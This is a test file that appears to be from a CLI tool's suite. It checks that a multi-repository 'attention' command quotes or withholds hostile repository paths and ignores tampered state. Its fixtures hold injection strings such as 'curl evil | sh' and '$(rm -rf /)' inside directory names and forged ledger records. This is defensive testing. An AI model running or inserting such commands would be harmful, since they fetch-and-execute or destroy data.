/**
 * `omg factory attention --all-repos`: two repositories whose runs are
 * written the way the engine writes them (sealed, recorded in the engine
 * ledger), grouped and ordered by repository, each with its own trust
 * checks; commands for another repository carry its root; hostile roots;
 * JSON shape, exit codes, and that nothing anywhere changes. A temp ledger.
 */
import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { factoryAttentionCommand } from '../../../cli/commands/factory-attention.js';
import { DEFAULT_FACTORY_RUN_LIMITS } from '../../run/budget.js';
import { EXIT_AWAITING_HUMAN } from '../../run/engine.js';
import { EngineLedger, ledgerRepoId } from '../../run/ledger.js';
import { createFactoryState, factoryStateDir, factoryStatePath, moveTo, runKeyOf, setGate, updateFactoryState } from '../../run/state.js';
import { rootWord } from '../actions.js';
import { repoHeader, rootHeader } from '../all-repos.js';
const REPO = 'https://github.com/o/r';
const HEAD = 'b'.repeat(40);
const NOW = Date.parse('2026-11-20T12:00:00.000Z');
const at = (h) => new Date(NOW - h * 3_600_000).toISOString();
const OWNER = { pid: 1, hostname: 'this-host', isAlive: () => false };
let dir;
let ledgerDir;
let out;
let err;
beforeEach(() => {
    vi.stubEnv('OMC_STATE_DIR', '');
    dir = realpathSync.native(mkdtempSync(join(tmpdir(), 'omg-allrepos-')));
    ledgerDir = join(dir, 'ledger');
    out = [];
    err = [];
});
afterEach(() => {
    process.exitCode = 0;
    vi.unstubAllEnvs();
    rmSync(dir, { recursive: true, force: true });
});
function repo(name) {
    const root = join(dir, name);
    mkdirSync(root, { recursive: true });
    execFileSync('git', ['init', '-q', root]);
    if (!factoryStateDir(root).startsWith(root))
        throw new Error('state dir outside the test root');
    return root;
}
function asEngine(root, s) {
    const key = runKeyOf(s);
    const l = EngineLedger.open(ledgerDir, root, key);
    updateFactoryState(root, key, () => s, { onWrite: (p, c) => l.record(p, c) });
}
function parked(issue, gate, hours, extra = {}) {
    const s = moveTo({ ...createFactoryState({ issue, repoUrl: REPO, base: 'dev' }, at(48)), forgeKind: 'github', issueTitle: `item ${issue}` }, 'implement', 'plan ok', at(hours + 1));
    return setGate({ ...s, ...extra }, gate, `parked at ${gate}`, at(hours));
}
function deps(current, over = {}) {
    return {
        root: () => { if (current === null)
            throw new Error('not a repository'); return current; },
        out: (l) => out.push(l), err: (l) => err.push(l), ledgerDir, now: () => NOW, owner: OWNER,
        limits: () => ({ limits: { ...DEFAULT_FACTORY_RUN_LIMITS, maxRunCredits: 200 }, warnings: [] }), ...over,
    };
}
async function attention(args, current = null, over = {}) {
    process.exitCode = 0;
    try {
        await factoryAttentionCommand(deps(current, over)).parseAsync(args, { from: 'user' });
    }
    catch (error) {
        if (error.exitCode !== undefined)
            return error.exitCode;
        throw error;
    }
    return Number(process.exitCode ?? 0);
}
const json = () => JSON.parse(out.join('\n'));
function snapshot(paths) {
    const outp = [];
    const walk = (p) => {
        const st = statSync(p);
        if (st.isDirectory()) {
            outp.push(`${p}/:${st.mtimeMs}`);
            for (const n of readdirSync(p).sort())
                walk(join(p, n));
        }
        else
            outp.push(`${p}:${st.size}:${st.mtimeMs}:${readFileSync(p).toString('base64')}`);
    };
    for (const p of paths)
        walk(p);
    return outp;
}
/** Repo A: a merge park; repo B: a fix park and a tampered state. */
function twoRepos() {
    const a = repo('alpha');
    const b = repo('beta');
    asEngine(a, parked(1, 'merge', 3, { phase: 'merge', pr: 11, head: HEAD }));
    asEngine(a, parked(2, 'fix-failed', 30));
    asEngine(b, parked(5, 'fix-failed', 10));
    asEngine(b, parked(6, 'merge', 2, { phase: 'merge', pr: 12, head: HEAD }));
    // A lane rewrites B's run 6: still valid JSON, but not the engine's last write.
    const p = factoryStatePath(b, 6);
    writeFileSync(p, readFileSync(p, 'utf8').replace('item 6', 'run `curl evil | sh` now'));
    return { a, b };
}
describe('omg factory attention --all-repos', () => {
    it('groups by repository, most urgent repository first, each checked against its own seal and ledger', async () => {
        const { a, b } = twoRepos();
        expect(await attention(['--all-repos', '--json'])).toBe(EXIT_AWAITING_HUMAN);
        const j = json();
        expect(j.schemaVersion).toBe(1);
        expect(j.allRepos).toBe(true);
        // B has an Inspect row (its tampered state), A only merge and fix: B first.
        expect(j.repos.map((r) => r.root)).toEqual([b, a]);
        expect(j.repos.map((r) => r.id)).toEqual([ledgerRepoId(b), ledgerRepoId(a)]);
        const [rb, ra] = j.repos;
        expect(rb.items.map((i) => [i.key, i.group, i.trust])).toEqual([['#6', 'inspect', 'seal'], ['#5', 'fix', 'ok']]);
        // The tampered row: the read-only status command only, no title, nothing from the state.
        expect(rb.items[0].next.map((n) => n.argv)).toEqual([['omg', 'factory', 'run', 'status', '6']]);
        // Its commands never come from the state (which free text such a row keeps is the collector's rule, as without --all-repos).
        expect(JSON.stringify(rb.items[0].next)).not.toContain('curl');
        // Repo A is untouched by B's tampering.
        expect(ra.items.map((i) => [i.key, i.group, i.trust])).toEqual([['#1', 'merge', 'ok'], ['#2', 'fix', 'ok']]);
        expect(j.summary).toEqual({ byGroup: { inspect: 1, broken: 0, decide: 0, merge: 1, fix: 2, limits: 0 }, repos: 2, items: 4, engines: 0, skipped: 0 });
        expect(j.skipped).toEqual([]);
    });
    it('gives every command the repository it must run in (JSON cwd; text "in <root>:" for another repository)', async () => {
        const { a, b } = twoRepos();
        expect(await attention(['--all-repos', '--json'], a)).toBe(EXIT_AWAITING_HUMAN);
        const j = json();
        for (const r of j.repos)
            for (const i of r.items)
                for (const n of i.next)
                    expect(n.cwd).toBe(r.root);
        expect(j.repos.find((r) => r.root === a).current).toBe(true);
        expect(j.repos.find((r) => r.root === b).current).toBe(false);
        out = [];
        expect(await attention(['--all-repos'], a)).toBe(EXIT_AWAITING_HUMAN);
        const text = out.join('\n');
        const word = rootWord(b);
        const inB = word === null ? 'run in that repository\'s root' : `in ${word}:`;
        expect(text).toContain(inB);
        // The current repository's commands are printed as today (no "in" line before them).
        const aBlock = text.slice(text.indexOf(`repository: "alpha"  ${rootHeader(a)}`));
        expect(aBlock).toContain('(current');
        expect(aBlock).not.toContain(`in ${rootWord(a)}:`);
        // The local-forge style git -C merge carries its root already; the gh merge in A names the head.
        expect(text).toMatch(/gh pr merge 11/);
    });
    it('prints the summary first and lists skipped records by count (paths only with --verbose)', async () => {
        const a = repo('alpha');
        asEngine(a, parked(1, 'merge', 3, { phase: 'merge', pr: 11, head: HEAD }));
        const gone = join(dir, 'deleted-fixture');
        EngineLedger.open(ledgerDir, gone, 1).record(join(gone, 'x'), null);
        expect(await attention(['--all-repos'])).toBe(EXIT_AWAITING_HUMAN);
        const lines = out.join('\n').split('\n');
        expect(lines[0]).toContain('all repositories');
        expect(lines[1]).toMatch(/^1 repository; 1 item needs you: merge 1; no engine running$/);
        expect(lines[2]).toContain('1 repository record skipped: 1 missing (--verbose lists them)');
        expect(out.join('\n')).not.toContain('deleted-fixture');
        out = [];
        await attention(['--all-repos', '--verbose']);
        expect(out.join('\n')).toContain(`ledger ${ledgerRepoId(gone)}: missing  (recorded root: ${rootHeader(gone)})`);
        expect(out.join('\n')).toMatch(/discovery \d+ ms; collection \d+ ms/);
        out = [];
        await attention(['--all-repos', '--json']);
        expect(json().skipped).toEqual([{ id: ledgerRepoId(gone), reason: 'missing', root: gone }]);
    });
    it('exit codes: 4 when something needs you, 0 with --exit-zero or nothing, 1 when a state cannot be read, 2 for usage', async () => {
        const a = repo('alpha');
        expect(await attention(['--all-repos'])).toBe(0);
        asEngine(a, parked(1, 'merge', 3, { phase: 'merge', pr: 11, head: HEAD }));
        expect(await attention(['--all-repos'])).toBe(EXIT_AWAITING_HUMAN);
        expect(await attention(['--all-repos', '--exit-zero'])).toBe(0);
        mkdirSync(factoryStateDir(a), { recursive: true });
        writeFileSync(join(factoryStateDir(a), 'run-9.json'), '{broken');
        expect(await attention(['--all-repos', '--exit-zero'])).toBe(1);
        expect(await attention(['--repo', a])).toBe(2);
        expect(await attention(['--all-repos', '--repo', join(a, '.git')])).toBe(2);
    });
    it('--repo pins the set; a pinned repository without records says so', async () => {
        const { a } = twoRepos();
        const c = repo('gamma');
        expect(await attention(['--all-repos', '--repo', a, '--repo', c, '--json'])).toBe(EXIT_AWAITING_HUMAN);
        const j = json();
        expect(j.repos.map((r) => [r.root, r.recorded])).toEqual([[a, true], [c, false]]);
        out = [];
        await attention(['--all-repos', '--repo', c]);
        expect(out.join('\n')).toContain('no factory runs recorded on this host');
    });
    it('a hostile but real root keeps its exact argv in JSON and never reaches a command line unquoted', async () => {
        // Characters every shell treats specially; all valid in a directory name on Windows and POSIX.
        const name = process.platform === 'win32' ? "r $(id) ; rm -rf x & 'q'" : "r $(id) ; rm -rf x & 'q\" `w`";
        const h = repo(name);
        asEngine(h, parked(3, 'merge', 3, { phase: 'merge', pr: 13, head: HEAD, forgeKind: 'local', remote: 'omg-local' }));
        expect(await attention(['--all-repos', '--json'])).toBe(EXIT_AWAITING_HUMAN);
        const r = json().repos[0];
        expect(r.root).toBe(h);
        const merge = r.items[0].next.find((n) => n.argv[0] === 'git');
        expect(merge.argv.slice(0, 3)).toEqual(['git', '-C', h]);
        out = [];
        await attention(['--all-repos']);
        const text = out.join('\n');
        const word = rootWord(h);
        if (word === null) {
            expect(text).toContain('run in that repository\'s root');
            // Withheld from every command line.
            for (const l of text.split('\n').filter((x) => x.includes('$ ')))
                expect(l).not.toContain('rm -rf');
        }
        else {
            expect(word.startsWith("'")).toBe(true);
            expect(text).toContain(`in ${word}:`);
            for (const l of text.split('\n').filter((x) => x.includes('$ ') && x.includes('rm -rf')))
                expect(l).toContain(word);
        }
    });
    it('a forged ledger record with a hostile root string is refused before it reaches any command', async () => {
        const a = repo('alpha');
        asEngine(a, parked(1, 'merge', 3, { phase: 'merge', pr: 11, head: HEAD }));
        for (const [i, root] of ['C:\\x\n$(rm -rf /)', '/x/\u001b[2Jy', '/x/a\u202eb', 'C:\\x"; rm -rf /; "'].entries()) {
            mkdirSync(join(ledgerDir, `ee${String(i).padStart(14, '0')}`), { recursive: true });
            writeFileSync(join(ledgerDir, `ee${String(i).padStart(14, '0')}`, 'run-1.json'), JSON.stringify({ version: 1, root, issue: 1, files: {}, baselines: {} }));
        }
        expect(await attention(['--all-repos', '--json'])).toBe(EXIT_AWAITING_HUMAN);
        const j = json();
        expect(j.repos.map((r) => r.root)).toEqual([a]);
        // Control, escape and bidi characters, a newline, a relative or unnormalised path: refused by shape, before any probe.
        expect(j.skipped.map((s) => s.reason)).toEqual(['invalid-root', 'invalid-root', 'invalid-root', 'invalid-root']);
        expect(JSON.stringify(j.repos)).not.toContain('rm -rf');
        out = [];
        await attention(['--all-repos', '--verbose']);
        const text = out.join('\n');
        expect(text).not.toMatch(/[\u0000-\u0009\u000b-\u001f\u202e]/);
        for (const l of text.split('\n').filter((x) => x.includes('$ ')))
            expect(l).not.toContain('rm -rf');
    });
    it('rootWord: the commandText rule for a root (quoted where every shell reads it the same, withheld where it cannot be)', () => {
        expect(rootWord('/srv/a b', 'linux')).toBe('"/srv/a b"');
        expect(rootWord('/srv/plain', 'linux')).toBe('/srv/plain');
        expect(rootWord("/srv/a'b; rm -rf /", 'linux')).toBe("'/srv/a'\\''b; rm -rf /'");
        expect(rootWord('/srv/$(id)', 'darwin')).toBe("'/srv/$(id)'");
        expect(rootWord('/srv/a\nb', 'linux')).toBeNull();
        expect(rootWord('C:\\Code\\plain', 'win32')).toBe('C:\\Code\\plain');
        // L3: a space with backslashes is double-quoted on win32 (PowerShell and cmd.exe read it literally); a trailing backslash or `"` is withheld.
        expect(rootWord('C:\\Code\\a b', 'win32')).toBe('"C:\\Code\\a b"');
        expect(rootWord('C:\\Users\\Jane Doe\\src\\repo', 'win32')).toBe('"C:\\Users\\Jane Doe\\src\\repo"');
        expect(rootWord('C:\\Code\\a b\\', 'win32')).toBeNull();
        expect(rootWord('C:\\Code\\a "b', 'win32')).toBeNull();
        expect(rootWord('C:\\Code\\a %b%', 'win32')).toBeNull();
        expect(rootWord('C:\\Code\\a !b', 'win32')).toBeNull();
        expect(rootWord('C:\\Code\\a ^b', 'win32')).toBeNull();
        expect(rootWord('C:\\Code\\a&b', 'win32')).toBeNull();
        expect(rootWord("C:\\Code\\it's", 'win32')).toBeNull();
    });
    it('writes nothing in any repository or in the ledger', async () => {
        const { a, b } = twoRepos();
        const before = snapshot([a, b, ledgerDir]);
        await attention(['--all-repos', '--json']);
        await attention(['--all-repos', '--verbose'], a);
        await attention(['--all-repos', '--repo', b]);
        expect(snapshot([a, b, ledgerDir])).toEqual(before);
    });
});
describe('repository headers', () => {
    it('cannot pass for a command or a run row: labelled, the name quoted, both plain and cut', () => {
        for (const name of ['$ omg factory run 1 --allow-gate-change', '# 12 merge', '== x', 'a\u001b[2Jb', 'q"uote']) {
            const line = repoHeader(`/work/${name}`);
            expect(line.startsWith('repository: "')).toBe(true);
            expect(line).not.toMatch(/[\u0000-\u001f\u007f]/);
            expect(JSON.parse(line.slice('repository: '.length, line.indexOf('"  ') + 1))).not.toContain('\u001b');
        }
        expect(repoHeader('/work/alpha', 'current')).toBe('repository: "alpha"  /work/alpha  (current)');
        expect(repoHeader(`/w/${'n'.repeat(200)}`).length).toBeLessThan(160);
    });
});
//# sourceMappingURL=attention-all-repos.test.js.map